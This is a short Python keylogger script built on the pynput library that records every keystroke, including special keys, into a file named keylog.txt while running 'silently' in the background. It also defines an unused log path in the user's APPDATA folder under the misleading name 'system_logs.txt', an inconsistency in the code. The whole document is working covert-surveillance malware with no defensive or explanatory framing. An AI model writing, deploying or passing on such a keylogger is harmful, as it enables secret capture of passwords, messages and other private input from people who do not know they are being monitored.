from pynput import keyboard
import os

log_file = os.path.join(os.getenv("APPDATA"), "system_logs.txt")
def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(f"[{key}]")

# Start the listener in the background
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Keep the program running silently
listener.join()
